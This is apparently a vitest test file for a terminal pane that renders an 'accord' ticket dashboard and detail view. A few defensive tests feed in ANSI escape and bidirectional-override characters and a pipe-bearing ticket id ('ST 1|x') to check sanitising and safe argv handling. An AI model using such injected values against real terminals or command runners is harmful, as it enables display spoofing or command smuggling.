            { id: 'ST-3', lane: 'M', title: 'Mine', stage: 'build', tasksDone: 2, tasksTotal: 5, claimedBy: 'an[1m@x' },
            { id: 'ST-11', title: 'Odd', stage: 'constructor', claimedBy: 'bob@x' },
          ],
          more: 0,
        },
        upNext: { rows: [{ id: 'ST-7', title: 'Blocked', stage: 'plan', idleDays: 3, blockedBy: ['ST-6', 'ST-4'] }, { id: 'ST-8' }], more: 2 },
        epics: { rows: [{ id: 'EP-1', title: 'E', done: 1, total: 3 }], more: 0 },
      }),
    ),
  });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-7'))).toBe(true));
  const bare = (p: Record<string, any> | undefined): Record<string, any> => {
    const rest = { ...p };
    delete rest.children;
    return rest;
  };
  const idBox = { width: 5, flexShrink: 0 };
  // Phase 08.7-04 D-05: the bar column holds the longest mini stage bar (five cells) between the id and the lane
  const barBox = { width: 5, flexShrink: 0, flexDirection: 'row' };
  const laneBox = { width: 4, flexShrink: 0 };
  const stageBox = { width: 12, flexShrink: 0 };
  const titleBox = { flexGrow: 1, flexShrink: 1 };
  for (const heading of ['YOURS', 'TEAM', 'READY', 'UP NEXT', 'EPICS']) {
    expect(h.cell(heading).text).toMatchObject({ bold: true, color: 'cyan' });
    expect(h.cell(heading).box.marginTop).toBe(1);
  }
  for (const w of ['ID', 'LANE', 'STAGE', 'TITLE']) {
    const hs = h.nodes('Text').filter((n) => flat(n.props.children) === w);
    expect(hs).toHaveLength(4);
    for (const n of hs) expect(n.props.dimColor).toBe(true);
  }
  for (const w of ['none', '+2 more', '0 in progress, 0 ready, 0 blocked, 0 backlog, 0 done']) expect(h.cell(w).text.dimColor).toBe(true);
  expect(h.cell('EP-1').text.bold).toBe(true);
  expect(h.cell('1/3 done').text.color).toBeUndefined();
  expect(bare(h.cell('1/3 done').box)).toEqual(stageBox);
  expect(bare(h.cell('E').box)).toEqual(titleBox);
  expect(h.row('EP-1').children).toHaveLength(4);
  const widthsHold = (): void => {
    const kids = h.row('ST-3').children as { props: Record<string, any> }[];
    expect(bare(kids[0].props)).toEqual(idBox);
    expect(bare(kids[1].props)).toEqual(barBox);
    expect(bare(kids[2].props)).toEqual(laneBox);
    expect(bare(kids[3].props)).toEqual(stageBox);
  };
  expect(h.cell('ST-3').text.bold).toBe(true);
  expect(h.row('ST-3')).toMatchObject({ flexDirection: 'row', columnGap: 2 });
  widthsHold();
  const kids = h.row('ST-3').children as { props: Record<string, any> }[];
  expect(kids).toHaveLength(5);
  expect(bare(kids[4].props)).toEqual(titleBox);
  expect(Object.keys(kids[4].props)).not.toContain('width');
  expect(Object.keys(kids[4].props)).not.toContain('minWidth');
  expect((kids[2].props.children[0] as { props: { children: string[] } }).props.children).toEqual(['M']);
  expect(bare(h.cell('LANE').box)).toEqual(laneBox);
  expect(bare(h.cell('ID').box)).toEqual(idBox);
  expect(bare(h.cell('STAGE').box)).toEqual(stageBox);
  expect(bare(h.cell('TITLE').box)).toEqual(titleBox);
  expect(bare(h.cell(LONG).box)).toEqual(titleBox);
  expect(h.cell('ID').row).toMatchObject({ flexDirection: 'row', columnGap: 2 });
  expect(h.cell(LONG).text.wrap).toBe('truncate');
  expect(h.buttonBox('show:ST-10')).toEqual({ width: 5, flexShrink: 0, children: undefined });
  expect(h.buttonBox('show:ST-7')).toEqual({ width: 5, flexShrink: 0, children: undefined });
  expect(h.cell('build 2/5').text.color).toBe('yellow');
  expect(h.cell('review').text.color).toBe('magenta');
  expect(h.cell('plan idle 3d').text.color).toBe('cyan');
  expect(h.cell('constructor').text.color).toBeUndefined();
  expect(h.cell('blocked by ST-6 ST-4').text.color).toBe('red');
  expect(h.cell('an [1m@x').text.dimColor).toBe(true);
  expect(h.texts().some((x) => x.includes('me@x'))).toBe(false);
  expect(h.texts().filter((x) => x.startsWith('blocked by'))).toHaveLength(1);
  expect(h.texts().filter((x) => x === 'an [1m@x')).toHaveLength(1);
  const second: string[][] = [];
  const walk = (n: any): void => {
    if (!n || typeof n !== 'object') return;
    const first = n.props?.children?.[0];
    if (n.type === 'Box' && n.props.flexDirection === 'row' && n.props.columnGap === 2 && first?.type === 'Box' && !(first.props.children?.length > 0)) {
      second.push((n.props.children as any[]).slice(1).map((c) => c.props.children.join('')));
    }
    for (const c of n.props?.children ?? []) walk(c);
  };
  walk(h.tree());
  expect(second).toEqual([['an [1m@x'], ['bob@x'], ['blocked by ST-6 ST-4']]); // document order: TEAM before UP NEXT
  expect(h.buttons().map((b) => b.key)).toEqual(['show:ST-10', 'show:ST-3', 'show:ST-11', 'show:ST-7', 'show:ST-8']);
  h.type('st-3');
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-7'))).toBe(false));
  widthsHold();
});

const LONG = 'Title '.repeat(40).trim();
const STEP = 'Given ' + 'word '.repeat(40).trim();
const TEST = 'a#' + 'x'.repeat(118);

it('ac-5 the detail view wraps long text whole while the table keeps its cut', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ stdout: JSON.stringify(board({ yours: { rows: [{ id: 'ST-1', title: LONG }], more: 0 } })) });
  await vi.waitFor(() => expect(h.buttons().map((b) => b.key)).toEqual(['show:ST-1']));
  press(h, 'show:ST-1');
  h.settle({ stdout: JSON.stringify(detailOf({ title: LONG, criteria: [{ ...(detailOf().criteria as any[])[0], steps: [STEP], test: TEST }] })) });
  await vi.waitFor(() => expect(h.texts()).toContain(STEP));
  for (const [s, kids] of [[LONG, [LONG]], [STEP, [STEP]], ['Test: ' + TEST, ['Test: ' + TEST]]] as [string, string[]][]) {
    const ns = h.nodes('Text').filter((n) => flat(n.props.children) === s);
    expect(ns, s).toHaveLength(1);
    expect(ns[0].props.children).toEqual(kids);
    expect(ns[0].props.wrap).toBe('wrap');
  }
  const blocks = h.nodes('Box').filter((n) => n.props.marginTop === 1);
  expect(blocks).toHaveLength(2);
  for (const n of blocks) expect(n.props.flexDirection).toBe('column');
  for (const n of h.nodes('Text')) expect(n.props.wrap).toBe('wrap');
  for (const t of h.texts()) for (const bad of ['\n', '...', '…']) expect(t).not.toContain(bad);
  press(h, 'back');
  await vi.waitFor(() => expect(h.input()).toBeDefined());
  expect(h.cell(LONG).text.wrap).toBe('truncate');
});

it('risk:complex-branching a failed or malformed show run shows a message with back', async () => {
  const cases: [(h: Awaited<ReturnType<typeof host>>) => void, string][] = [
    [(h) => h.settle({ exitCode: 2, stderr: 'npm warn x\nno ticket ST-1 in accord/tickets/\n' }), 'no ticket ST-1 in accord/tickets/'],
    [(h) => h.fail(new Error('timed out')), 'accord did not finish: timed out'],
    [(h) => h.settle({ stdout: 'not json' }), 'accord show --json printed no ticket'],
    [(h) => h.settle({ stdout: '{}' }), 'accord show --json printed no ticket'],
    [(h) => h.settle({ stdout: JSON.stringify(detailOf({ criteria: [{ steps: 'x' }] })) }), 'accord show --json printed no ticket'],
  ];
  for (const [run, text] of cases) {
    const h = await host(await loadPanel());
    await h.fire('session.start', start);
    h.settle({ stdout: twoRows });
    await vi.waitFor(() => expect(h.buttons().map((b) => b.key)).toContain('show:ST-1'));
    press(h, 'show:ST-1');
    run(h);
    await vi.waitFor(() => expect(h.texts().join("|"), text).toContain(text));
    expect(h.buttons().map((b) => b.key)).toEqual(['back']);
    const calls = h.$.process.run.mock.calls.length;
    press(h, 'back');
    await vi.waitFor(() => expect(h.texts()).toContain('ST-2'));
    expect(h.$.process.run.mock.calls.length).toBe(calls);
  }
});

it('risk:concurrency an open detail reruns show after a turn and drops a result for a closed one', async () => {
  const h = await host(await loadPanel());
  const calls = (): number => h.$.process.run.mock.calls.length;
  const argv = (i: number): string[] => h.$.process.run.mock.calls[i][0];
  await h.fire('session.start', start);
  h.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(h.buttons().map((b) => b.key)).toContain('show:ST-1'));
  press(h, 'show:ST-1');
  h.settle({ stdout: JSON.stringify(detailOf()) });
  await vi.waitFor(() => expect(h.texts()).toContain('Stage: build'));
  let n = calls();
  await h.fire('turn.complete', { reason: 'answer' });
  expect(calls()).toBe(n + 2);
  expect(argv(n).slice(3)).toEqual(['dashboard', '--json']);
  expect(argv(n + 1).slice(3)).toEqual(['show', 'ST-1', '--json']);
  h.settle({ stdout: twoRows });
  h.settle({ stdout: JSON.stringify(detailOf({ title: 'Renamed' })) });
  await vi.waitFor(() => expect(h.texts()).toContain('Renamed'));
  n = calls();
  await h.fire('turn.complete', { reason: 'answer', agentId: 'a1' });
  expect(calls()).toBe(n);
  await h.fire('turn.complete', { reason: 'answer' });
  press(h, 'back');
  h.settle({ stdout: twoRows });
  h.settle({ stdout: JSON.stringify(detailOf({ title: 'Late' })) });
  await vi.waitFor(() => expect(h.texts()).toContain('ST-2'));
  await new Promise((r) => setTimeout(r, 10));
  expect(h.texts().some((x) => x.includes('Late') || x.includes('Stage: build'))).toBe(false);
  // ST-1 pending, back, open ST-2: ST-1's result is dropped, ST-2's is shown
  press(h, 'show:ST-1');
  await vi.waitFor(() => expect(h.buttons().map((b) => b.key)).toContain('back'));
  press(h, 'back');
  await vi.waitFor(() => expect(h.buttons().map((b) => b.key)).toContain('show:ST-2'));
  press(h, 'show:ST-2');
  h.settle({ stdout: JSON.stringify(detailOf({ title: 'Old' })) });
  await vi.waitFor(() => expect(h.inflight()).toBe(1));
  expect(h.texts().some((x) => x.includes('Old'))).toBe(false);
  h.settle({ stdout: JSON.stringify(detailOf({ id: 'ST-2', title: 'Export' })) });
  await vi.waitFor(() => expect(h.texts()).toContain('Export'));
  expect(h.buttons().map((b) => b.key)).toEqual(['back', 'pick-up:ST-2']);
  await h.fire('turn.complete', { reason: 'answer' });
  h.settle({ stdout: JSON.stringify(board({ yours: { rows: [{ id: 'ST-2', title: 'Export' }], more: 0 } })) });
  h.settle({ stdout: JSON.stringify(detailOf({ id: 'ST-2', title: 'Export' })) });
  await vi.waitFor(() => expect(h.buttons().map((b) => b.key)).toEqual(['back', 'continue:ST-2']));
});

it('risk:security detail text cannot put control characters into the pane', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(h.buttons().map((b) => b.key)).toContain('show:ST-1'));
  press(h, 'show:ST-1');
  const dirty = (s: string): string => s + '\u001b[31m x\u202e y\u2028z';
  const base = detailOf().criteria as any[];
  h.settle({
    stdout: JSON.stringify(detailOf({ title: dirty('T'), holder: dirty('H'), intent: [dirty('I')], criteria: [{ ...base[0], steps: [dirty('Given')] }] })),
  });
  await vi.waitFor(() => expect(h.texts().some((x) => x.startsWith('Holder: H'))).toBe(true));
  const bad = [0x1b, 0x202e, 0x2028];
  for (const t of h.texts()) for (const c of t) expect(bad).not.toContain(c.codePointAt(0));
});

it('ac-4 the panel shows up next while the viewer holds work', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({
    stdout: JSON.stringify(
      board({
        yours: { rows: [{ id: 'ST-AN-9', title: 'Audit' }], more: 0 },
        upNext: {
          rows: [
            { id: 'ST-AN-1', title: 'Export' },
            { id: 'ST-AN-2', title: 'Import' },
          ],
          more: 0,
        },
      }),
    ),
  });
  await vi.waitFor(() => {
    const t = h.texts();
    const at = (s: string): number => t.findIndex((x) => x.includes(s));
    const order = [at('YOURS'), at('ST-AN-9'), at('UP NEXT'), at('ST-AN-1'), at('ST-AN-2')];
    expect(order.every((i) => i >= 0)).toBe(true);
    expect(order).toEqual([...order].sort((a, b) => a - b));
  });
});

// Phase 8.2 D-07, D-08 (8.2-ac-7): the CLI prints claimedByShown / holderShown only when the person asked for initials; the panel draws them in place of the email and falls back to the email.
it('risk:security the panel shows claimedByShown on a TEAM row and the email without it (8.2-ac-7)', async () => {
  const { view } = await loadView();
  const state = {
    dashboard: board({
      yours: { rows: [{ id: 'T-0', title: 'Mine', claimedBy: 'me@x.io', claimedByShown: 'ME' }], more: 0 },
      team: {
        rows: [
          { id: 'T-1', title: 'One', claimedBy: 'a@x.io', claimedByShown: 'AX' },
          { id: 'T-2', title: 'Two', claimedBy: 'b@x.io' },
          { id: 'T-3', title: 'Three', claimedBy: 'c@x.io', claimedByShown: 7 },
          { id: 'T-4', title: 'Four', claimedBy: 'd@x.io', claimedByShown: 'D\u001b[31mX' },
        ],
        more: 0,
      },
    }),
  };
  const v = view(state, '');
  const who = (heading: string, id: string): string => v.sections.find((s: any) => s.heading === heading).rows.find((r: any) => r.id === id).who;
  expect(who('TEAM', 'T-1')).toBe('AX');
  expect(who('TEAM', 'T-2')).toBe('b@x.io');
  expect(who('TEAM', 'T-3')).toBe('c@x.io'); // a display field that is not a string falls back to the email
  expect(who('TEAM', 'T-4')).toBe('D [31mX'); // an escape character is cleaned
  expect(who('YOURS', 'T-0')).toBe(''); // the viewer's own section shows no person, by design
});

it('risk:security the detail view prints holderShown as the Holder and falls back to holder (8.2-ac-7)', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'accord-panel-view-'));
  dirs.push(dir);
  for (const f of pluginTargets({ runtimes: ['claude'] }, PKG)) {
    const p = join(dir, ...f.path.split('/'));
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, f.text);
  }
  const { detailView } = (await import(/* @vite-ignore */ pathToFileURL(join(dir, '.claude/accord-panel/plugin/hooks/view.js')).href)) as { detailView: (a: unknown) => any };
  const holder = (over: Record<string, unknown>): string =>
    detailView({ state: { ticket: detailOf(over) } }).facts.find((f: string) => f.startsWith('Holder:'));
  expect(holder({ holder: 'a@x.io', holderShown: 'AX' })).toBe('Holder: AX');
  expect(holder({ holder: 'a@x.io' })).toBe('Holder: a@x.io');
  expect(holder({ holder: 'a@x.io', holderShown: 5 })).toBe('Holder: a@x.io');
  expect(holder({ holder: 'a@x.io', holderShown: 'A\u202eX' })).toBe('Holder: A X');
  expect(holder({ holder: null })).toBe('Holder: none');
});

// Phase 08.7 D-07, A-02: one stage reader draws the bar for every lane; Phase 10's stage table replaces it.
it('risk:parsing pipelineOf maps lanes M S and R and every stage to cells with turned-off stages marked (D-07)', async () => {
  const { pipelineOf } = await loadView();
  const cols = (cells: any[], k: string): unknown[] => cells.map((c) => c[k]);
  const m = pipelineOf({ lane: 'M', stage: 'build', tasksDone: 2, tasksTotal: 5 });
  expect(cols(m, 'key')).toEqual(['intent', 'plan', 'build', 'review', 'verify']);
  expect(cols(m, 'label')).toEqual(['intent/approach', 'plan', 'build 2/5', 'review', 'verify']);
  expect(cols(m, 'state')).toEqual(['done', 'done', 'current', 'todo', 'todo']);
  expect(cols(m, 'color')).toEqual(['blue', 'cyan', 'yellow', 'magenta', 'green']);
  expect(cols(pipelineOf({ lane: 'M', stage: 'done', tasksDone: 5, tasksTotal: 5 }), 'state')).toEqual(['done', 'done', 'done', 'done', 'done']);
  const s = pipelineOf({ lane: 'S', stage: 'review' });
  expect(cols(s, 'key')).toEqual(['intent', 'build', 'review']);
  expect(cols(s, 'state')).toEqual(['done', 'done', 'current']);
  expect(cols(s, 'label')[1]).toBe('build');
  const r = pipelineOf({ lane: 'R', stage: 'research' });
  expect(cols(r, 'key')).toEqual(['intent', 'research']);
  expect(cols(r, 'state')).toEqual(['done', 'current']);
  expect(cols(r, 'color')).toEqual(['blue', 'cyan']);
  for (const lane of ['L', 'P']) expect(cols(pipelineOf({ lane, stage: 'plan' }), 'key')).toEqual(cols(m, 'key'));
  expect(cols(pipelineOf({ lane: 'L', stage: 'plan' }), 'label')[0]).toBe('intent/approach');
  expect(cols(pipelineOf({ lane: 'M', stage: 'build', tasksDone: 2, tasksTotal: 5, stagesOff: ['plan'] }), 'state')).toEqual(['done', 'off', 'current', 'todo', 'todo']);
  expect(cols(pipelineOf({ lane: 'M', stage: 'constructor' }), 'state')).toEqual(['todo', 'todo', 'todo', 'todo', 'todo']);
  expect(cols(pipelineOf({ lane: 'M', stage: 'review', review: { round: 2, cap: 5 } }), 'label')[3]).toBe('review r2/5');
});

// Phase 08.7 D-03: a tab label carries a number only when the JSON holds it.
it("risk:parsing tab labels read the json's own numbers (D-03)", async () => {
  const { tabLabels } = await loadView();
  const state = {
    dashboard: board({
      yours: { rows: [{ id: 'ST-1', title: 'Login form' }], more: 0 },
      ready: { rows: [{ id: 'ST-2', title: 'Export' }, { id: 'ST-3', title: 'Import' }], more: 0 },
      team: { rows: [{ id: 'ST-4', title: 'A' }, { id: 'ST-5', title: 'B' }], more: 1 },
    }),
  };
  const labels = (t: Record<string, unknown>, running = 0) => tabLabels({ state, ticket: { id: 'ST-1', state: { ticket: detailOf(t) } }, running });
  expect(labels({}).dashboard.summary).toBe('1 yours · 2 ready · 3 team');
  expect(labels({}).dashboard.label).toBe('2 dashboard 1 yours · 2 ready · 3 team');
  expect(labels({ stage: 'build' }).ticket.label).toBe('1 ticket ST-1 build');
  expect(labels({ stage: 'review', review: { cycle: 1, round: 2, cap: 5, rounds: [] } }).ticket.label).toBe('1 ticket ST-1 review r2/5');
  expect(labels({}, 3).ticket.label).toContain('◐3');
  expect(labels({}, 0).ticket.label).not.toContain('◐');
  expect(labels({ log: [{ at: 5, kind: 'gate', text: 'gate done FAIL: red', fail: true }] }).ticket.label).toContain('gate failed');
  expect(labels({ log: [{ at: 5, kind: 'gate', text: 'gate done PASS' }] }).ticket.label).not.toContain('gate failed');
});

const claimed = JSON.stringify(
  board({
    current: 'ST-1',
    yours: { rows: [{ id: 'ST-1', title: 'Login form' }], more: 0 },
    ready: { rows: [{ id: 'ST-2', title: 'Export' }], more: 0 },
  }),
);
const SHOW = (id: string): string[] => ['npx', '--yes', '@accord-dev/accord@9.9.9', 'show', id, '--json'];
// the pane of a ticket worktree after its dashboard and its ticket `show` both settled
async function claimedPane(): Promise<Awaited<ReturnType<typeof host>>> {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ stdout: claimed });
  await vi.waitFor(() => expect(h.$.process.run).toHaveBeenLastCalledWith(SHOW('ST-1'), { timeoutMs: 120000 }));
  h.settle({ stdout: JSON.stringify(detailOf()) });
  await vi.waitFor(() => expect(h.texts()).toContain('build 1/3'));
  return h;
}
const marked = (h: Awaited<ReturnType<typeof host>>): El[] => ['Box', 'Text', 'Button', 'Input'].flatMap((t) => h.nodes(t)).filter((n) => n.props.autoFocus === true);
const tabs = (h: Awaited<ReturnType<typeof host>>): Record<string, any> => Object.fromEntries(h.buttons().filter((b) => String(b.key).startsWith('tab:')).map((b) => [b.key, b]));

// Phase 08.7 D-03, D-10: the pane opens on the ticket tab for the ticket this worktree claimed and on the dashboard with one hint line otherwise.
it('risk:regression the pane opens on the ticket tab for the claimed ticket and on the dashboard with one hint line otherwise (D-03 D-10)', async () => {
  const h = await claimedPane();
  expect(tabs(h)['tab:ticket']).toMatchObject({ hotkey: '1', variant: 'primary' });
  expect(tabs(h)['tab:dashboard']).toMatchObject({ hotkey: '2', variant: 'secondary' });
  expect(h.texts()).toContain('ST-1 Login form');
  expect(h.texts()).toContain('build 1/3');
  expect(h.input()).toBeUndefined();
  expect(marked(h)).toEqual([]);
  const other = await host(await loadPanel());
  await other.fire('session.start', start);
  other.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(other.texts().some((x) => x.includes('ST-2'))).toBe(true));
  expect(Object.keys(tabs(other))).toEqual([]);
  const t = other.texts();
  expect(t.indexOf('No ticket in flight in this worktree')).toBeGreaterThanOrEqual(0);
  expect(t.indexOf('No ticket in flight in this worktree')).toBeLessThan(t.indexOf('YOURS'));
  expect(other.cell('No ticket in flight in this worktree').text.dimColor).toBe(true);
  expect(other.input()?.autoFocus).toBe(true);
  expect(other.$.process.run).toHaveBeenCalledTimes(1);
});

// Phase 08.7 D-03, A-04 (probe row A4 `keys: field takes digits`, read so by A-09): a picked tab stays, the in-flight id jumps, and the search field takes focus only when clicked while a ticket is in flight.
it('risk:complex-branching keys 1 and 2 switch tabs a picked tab stays and the in-flight id jumps to the ticket tab (D-03)', async () => {
  const h = await claimedPane();
  const calls = (): number => h.$.process.run.mock.calls.length;
  press(h, 'tab:dashboard');
  await vi.waitFor(() => expect(h.input()).toBeDefined());
  expect(h.texts()).toContain('ST-2');
  expect(tabs(h)['tab:dashboard'].variant).toBe('primary');
  expect(tabs(h)['tab:ticket'].variant).toBe('secondary');
  expect(tabs(h)['tab:ticket'].hotkey).toBe('1');
  expect(tabs(h)['tab:dashboard'].hotkey).toBe('2');
  expect(h.input()?.autoFocus).toBeUndefined();
  expect(marked(h)).toEqual([]);
  await h.fire('turn.complete', { reason: 'answer' });
  // Phase 08.8.1 IN-03: the dashboard run settles first and the ticket's show follows it (it was two runs in flight at once before)
  await vi.waitFor(() => expect(h.inflight()).toBe(1));
  h.settle({ stdout: claimed });
  await vi.waitFor(() => expect(h.inflight()).toBe(1));
  h.settle({ stdout: JSON.stringify(detailOf({ title: 'Renamed' })) });
  await vi.waitFor(() => expect(h.inflight()).toBe(0));
  await new Promise((r) => setTimeout(r, 10));
  expect(h.input()).toBeDefined();
  expect(tabs(h)['tab:dashboard'].variant).toBe('primary');
  const before = calls();
  press(h, 'show:ST-1');
  await vi.waitFor(() => expect(h.texts()).toContain('ST-1 Renamed'));
  expect(calls()).toBe(before);
  expect(h.input()).toBeUndefined();
  expect(tabs(h)['tab:ticket'].hotkey).toBe('1');
  expect(tabs(h)['tab:dashboard'].hotkey).toBe('2');
  press(h, 'tab:dashboard');
  await vi.waitFor(() => expect(h.input()).toBeDefined());
  press(h, 'show:ST-2');
  expect(h.$.process.run).toHaveBeenLastCalledWith(SHOW('ST-2'), { timeoutMs: 120000 });
  h.settle({ stdout: JSON.stringify(detailOf({ id: 'ST-2', title: 'Export' })) });
  await vi.waitFor(() => expect(h.buttons().map((b) => b.key)).toContain('back'));
  expect(Object.keys(tabs(h))).toEqual(['tab:ticket', 'tab:dashboard']);
  // a dashboard that no longer names a claimed ticket drops the tab strip and the ticket
  press(h, 'back');
  await h.fire('turn.complete', { reason: 'answer' });
  await vi.waitFor(() => expect(h.inflight()).toBeGreaterThanOrEqual(1));
  h.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(Object.keys(tabs(h))).toEqual([]));
  expect(h.texts()).toContain('No ticket in flight in this worktree');
  expect(h.input()?.autoFocus).toBe(true);
});

// Phase 08.7 D-10: an id out of the JSON becomes an argv element, so only a safe id may reach `show`.
it('risk:security a current id that is not a safe id never reaches a command (D-10)', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ stdout: JSON.stringify(board({ current: 'ST 1|x', yours: { rows: [{ id: 'ST-1', title: 'Login form' }], more: 0 } })) });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-1'))).toBe(true));
  await new Promise((r) => setTimeout(r, 10));
  expect(Object.keys(tabs(h))).toEqual([]);
  expect(h.texts()).toContain('No ticket in flight in this worktree');
  expect(h.$.process.run).toHaveBeenCalledTimes(1);
  expect(h.$.process.run.mock.calls.some((c: any[]) => c[0].includes('show'))).toBe(false);
});

// ---- Phase 08.7-07: the ticket tab's review rounds, criteria, session log and failure box (D-04, D-08, D-02) ----

const tally = (open = 0, fixed = 0, deferred = 0): Record<string, number> => ({ open, fixed, deferred });
const reviewOf = (over: Record<string, unknown> = {}): Record<string, unknown> => ({
  cycle: 1,
  round: 2,
  cap: 5,
  verdict: 'converged',
  rounds: [
    { n: 1, findings: { Must: tally(1, 2), Should: tally(0, 0, 1), Nice: tally() } },
    { n: 2, final: true, security: 'ran', findings: { Must: tally(), Should: tally(), Nice: tally() } },
  ],
  ...over,
});
const critOf = (id: string, title: string, label: string): Record<string, unknown> => ({ id, title, steps: [], label, test: null, testResult: null, ticked: false, verification: null });
// ten log entries newest first, the third one an executor report; `at` counts back from now so the ages read as seconds and minutes
const logOf = (): Record<string, unknown>[] => {
  const now = Math.floor(Date.now() / 1000);
  return Array.from({ length: 10 }, (_, i) =>
    i === 2 ? { at: now - 30 - i * 40, kind: 'report', text: 'executor report task 1' } : { at: now - 30 - i * 40, kind: 'commit', text: `commit number ${i}` },
  );
};
// the pane of a claimed ticket after `show` settled with these keys on top of detailOf()
async function paneWith(over: Record<string, unknown>, tweak?: (h: Awaited<ReturnType<typeof host>>) => void): Promise<Awaited<ReturnType<typeof host>>> {
  const h = await host(await loadPanel());
  tweak?.(h);
  await h.fire('session.start', start);
  h.settle({ stdout: claimed });
  await vi.waitFor(() => expect(h.$.process.run).toHaveBeenLastCalledWith(SHOW('ST-1'), { timeoutMs: 120000 }));
  h.settle({ stdout: JSON.stringify(detailOf(over)) });
  await vi.waitFor(() => expect(h.texts()).toContain('ST-1 Login form'));
  return h;
}
const textsIn = (el: any): string[] => {
  const out: string[] = [];
  const walk = (n: any): void => {
    if (!n || typeof n !== 'object') return;
    if (n.type === 'Text') {
      out.push(flat(n.props.children));
      return;
    }
    for (const c of n.props?.children ?? []) walk(c);
  };
  walk(el);
  return out;
};
const kids = (row: Record<string, any>): string[] => (row.children as any[]).flatMap((c) => textsIn(c));

// Phase 08.7 D-04 (as amended by A-01): the review block reads per round and per severity; the criteria and the log come from the same JSON.
it('risk:regression the ticket tab draws the review rounds the criteria and the session log from show json (D-04)', async () => {
  const log = logOf();
  const h = await paneWith({ stage: 'review', review: reviewOf(), criteria: [critOf('ac-1', 'Logs in', 'passing'), critOf('ac-2', 'Logs out', 'failing'), critOf('ac-3', 'Remembers me', 'untested')], log });
  const t = h.texts();
  expect(t).toContain('REVIEW r2/5 converged');
  expect(kids(h.row('r1/5'))).toEqual(['r1/5', 'Must 1 open 2 fixed', 'Should 1 deferred']);
  expect(kids(h.row('r2/5 final'))).toEqual(['r2/5 final', 'no findings', 'security lens ran']);
  expect(h.cell('r1/5').text.bold).toBe(true);
  expect(t).toContain('CRITERIA');
  for (const [id, title, label] of [['ac-1', 'Logs in', 'passing'], ['ac-2', 'Logs out', 'failing'], ['ac-3', 'Remembers me', 'untested']]) {
    expect(kids(h.row(title))).toEqual([id, title, label]);
    expect(h.cell(title).text.wrap).toBe('truncate');
  }
  expect(h.cell('passing').text.color).toBe('green');
  expect(h.cell('failing').text.color).toBe('red');
  expect(h.cell('untested').text.dimColor).toBe(true);
  expect(t).toContain('LOG');
  const rest = t.slice(t.indexOf('LOG') + 1);
  expect(rest).toHaveLength(16);
  for (let i = 0; i < 8; i++) {
    expect(rest[2 * i]).toMatch(/^[0-9]+[smhd]$/);
    expect(rest[2 * i + 1]).toBe(log[i].text);
  }
  expect(rest).toContain('executor report task 1');
  expect(rest).not.toContain('commit number 8');
});

// Phase 08.7 D-04: the rows are built from the JSON alone, nothing is counted in the view.
it('risk:parsing review rows criteria rows and log rows are built from the json alone (D-04)', async () => {
  const { reviewRows, criteriaRows, ago, logRows, failureOf, LOG_SHOWN } = await loadView();
  const zero = { Must: tally(), Should: tally(), Nice: tally() };
  const two = reviewRows({ cycle: 2, round: 1, cap: 5, rounds: [{ n: 1, added: true, security: 'none', findings: zero }] });
  expect(two.heading).toBe('REVIEW cycle 2 r1/5');
  expect(two.rounds).toEqual([{ head: 'r1/5 added', parts: ['no findings'], security: 'no security pattern' }]);
  const rows = reviewRows(reviewOf());
  expect(rows.heading).toBe('REVIEW r2/5 converged');
  expect(rows.rounds[0]).toEqual({ head: 'r1/5', parts: ['Must 1 open 2 fixed', 'Should 1 deferred'], security: undefined });
  expect(rows.rounds[1]).toMatchObject({ head: 'r2/5 final', parts: ['no findings'], security: 'security lens ran' });
  const sev = reviewRows({ cycle: 1, round: 3, cap: 5, rounds: [{ n: 3, findings: { Must: tally(0, 0, 4), Should: tally(5), Nice: tally(0, 6) } }] });
  expect(sev.rounds[0].parts).toEqual(['Must 4 deferred', 'Should 5 open', 'Nice 6 fixed']);
  const colors = criteriaRows([critOf('a', 'A', 'failing'), critOf('b', 'B', 'blocked'), critOf('c', 'C', 'verified'), critOf('d', 'D', 'passing'), critOf('e', 'E', 'not run'), critOf('f', 'F', 'untested')]);
  expect(colors.map((c: any) => c.color)).toEqual(['red', 'red', 'green', 'green', 'yellow', 'dim']);
  expect(colors[0]).toEqual({ id: 'a', title: 'A', label: 'failing', color: 'red' });
  expect([ago(100, 90), ago(0, 59), ago(0, 60), ago(0, 3599), ago(0, 3600), ago(0, 86399), ago(0, 86400)]).toEqual(['0s', '59s', '1m', '59m', '1h', '23h', '1d']);
  const log = Array.from({ length: 12 }, (_, i) => ({ at: 1000 - i, kind: i === 1 ? 'gate' : 'commit', text: `t${i}`, ...(i === 1 ? { fail: true } : {}) }));
  expect(LOG_SHOWN).toBe(8);
  const shown = logRows(log, 1010);
  expect(shown.map((r: any) => r.text)).toEqual(['t0', 't1', 't2', 't3', 't4', 't5', 't6', 't7']);
  expect(shown[1]).toEqual({ age: '11s', text: 't1', fail: true });
  // Phase 08.8.1 W4: the newest gate run (t1, failed) shows although a newer commit (t0) sits above it
  expect(failureOf(log)).toEqual({ text: 't1' });
  expect(failureOf([log[1]])).toEqual({ text: 't1' });
  expect(failureOf(undefined)).toBeUndefined();
});

// Phase 08.7 D-04: only the newest log entry decides the failure box, and the tab label follows it.
it('risk:complex-branching a newest failed gate run shows the failure block and the tab label says gate failed (D-04)', async () => {
  const now = Math.floor(Date.now() / 1000);
  const gate = { at: now - 20, kind: 'gate', text: 'gate done FAIL: criterion ac-2 has no passing test', fail: true };
  const h = await paneWith({ log: [gate, { at: now - 60, kind: 'commit', text: 'build: export' }] });
  const box = h.nodes('Box').find((b) => b.props.borderColor === '#ff6b6b');
  expect(box?.props.borderStyle).toBe('round');
  expect(textsIn(box)).toEqual(['Gate failed', gate.text]);
  const heading = (box?.props.children as any[]).find((c) => c.type === 'Text' && c.props.children[0] === 'Gate failed');
  // Phase 08.8.1-07 L-01 L-02: the failure box takes the person's failure colour, aurora's by default
  expect(heading.props).toMatchObject({ bold: true, color: '#ff6b6b' });
